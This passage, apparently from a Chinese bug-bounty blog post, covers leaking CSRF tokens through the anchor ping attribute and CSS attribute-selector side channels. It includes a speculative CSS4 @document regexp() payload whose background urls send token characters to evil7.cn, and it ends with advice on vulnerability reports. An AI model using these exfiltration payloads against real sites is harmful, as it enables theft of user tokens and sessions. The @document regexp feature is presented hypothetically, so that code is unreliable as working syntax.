但是！ping属性又是怎么工作的呢？
ping属性在用户点击链接时，统计用户点击的内容发送到指定服务器，所以不管是否刷新跳转页面是否点击的是个锚点链接， **只要有点击发生** 其实ping都是
**正常发出ping请求的** ，所以即使href中是个锚点不是链接，我们的server也能统计到用户点了什么（ping-from/ping-to）。同样，哪怕csp和waf做了一定的安全处理，让我们没法跨域情况实现获取到其他站点的`ping-from：
https://domain.com/token=csrfxxxx1234`，我们也可以通过hash锚点，让链接指向实际为`https://domain.com/token=csrfxxxx1234#hash`的链接，hash不会破坏浏览器地址栏现有的链接，但我们完全可以在server上看到一条ping流量带出了ping-to属性，从而完成 **不破坏现有URL情况下，通过ping-to带出URL的内容**
比如这样：
    ping_leak
哪怕跨域情况ping-from丢失，我们也可通过带出有ping-to的访问请求得到token。所以即便进行了no-referrer处理，我们还是可以利用a标签的ping属性带出token的。
### 偏方：CSS选择器侧信道方式获取
如果有``这样的一个DOM，我们无法注入其他上述方式的DOM，或者干脆控制不了DOM，唯独例外却有一个style自定义功能，或者说CSS可控？那我们能做什么呢？
如上我们可以用xss选择器，选中name为token的并且value第一个字符为"c"的input元素，并将其background属性设置为一个外带流量，这样就能泄露出token的首个字符。
一个个字符泄露，每一个都得多一次payload的修改，实施比较麻烦，但这样的选择器还有很多，还有很多可以利用的。我们来一起康康：
通过文档了解，我们可以通过`^=`选择开头也可以通过`$=`选择结尾，但css中一个同类属性会被同样的属性覆盖，那么我们有没有办法加快css选择器的侧信道露点速度呢？
类似`:root`的伪类可以极大程度帮到我们，我们没法一次给`input[name="token"][value^="c"]`和`input[name="token"][value$="4"]`同时绑定两个不同的`background`属性，这是显而易见的（最新值覆盖原因），但是我们可以试着添加`:root`伪类属性，在符合条件情况下，给他的根元素设置`background`。这下，前后开工，效率成功提高一倍岂不美哉！？
如果以上测试均成立了，并且发现目标可以添加``标签（或者有办法主动刷新页面）那就更方便了，免去多次发送payload每个字符单独爆破，直接自动刷新依次leak即可得出出整个token。
### 点到为止顺便发散一下思维
要是某天css里支持完全的直接正则呢？呵呵呵，那可不得了！你是不是说像这样
（实际上真就有这么骚，只是还得等。关键词 `css4 @document regexp()` 链接
 ）
当css4发布的那天，开发运维将会想起被css选择器中正则魔法支配的恐惧：
demo:
    # 泄露出token第1个字符
    @document regexp("/token=a.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_1=a")}
    }
    @document regexp("/token=b.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_1=b")}
    }
    ......
    @document regexp("/token=z.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_1=z")}
    }
    ......
    # 泄露出token第2个字符
    @document regexp("/token=.{2}a.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_2=a")}
    }
    @document regexp("/token=.{2}b.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_2=b")}
    }
    ......
    @document regexp("/token=.{2}z.*/") {
      div:nth-child(1) { background: url("https://evil7.cn/?token_2=z")}
    }
    ......
    # 泄露出token第3个字符
    @document regexp("/token=.{3}a.*/") {
      div:nth-child(3) { background: url("https://evil7.cn/?token_3=a")}
    }
    ......
于是乎，等css4来临之时，我们将可以直接通过css选择器中复杂正则操作，快速依次泄露整个token或者URL中其他关键信息 :P
以上总结分享全来自实战报告，仅供巩固复习或拓展思路，具体细节相关队员知者自知，只求师傅们互相交流，其他方向薄弱环节顺道带带我，反正就hin棒棒了嘛~
## 后记
前端攻击的分类和评分一直为各位白帽子所诟病，selfxss就忽略？csrf就低危？不不不，单从漏洞评级上看确实如此，但从真实攻击的实施目的上看，他们能达到的效果其实是一样的，所以大家也要给SRC一些时间，等待评级细化区分成本评级、效果评级的多维度综合评级标准。目前看来，BAT的专属SRC已经进入按影响评级的思想高度，在任何手段下只要造成用户敏感信息泄露那就是敏感信息泄露、任何手段造成损坏用户权益的恶意操作都能有效评高分。
所以各位白帽子也要结合项目内容、所出现漏洞的性质和实际影响来决定自评。好的报告 = 一个可靠的手法 + 一个清晰的攻击思路 + 一个模拟攻击场景 +
一份足量的危害证明
拿分和申诉翻盘的根本告诉你了，以后看到小问题小bug先记下来，说不定哪天就来个《UI大小不一到0dayRCE内网漫游》。
不管有没有进展，不管局势多么挠头，答应我，1v9也要坚持打下去！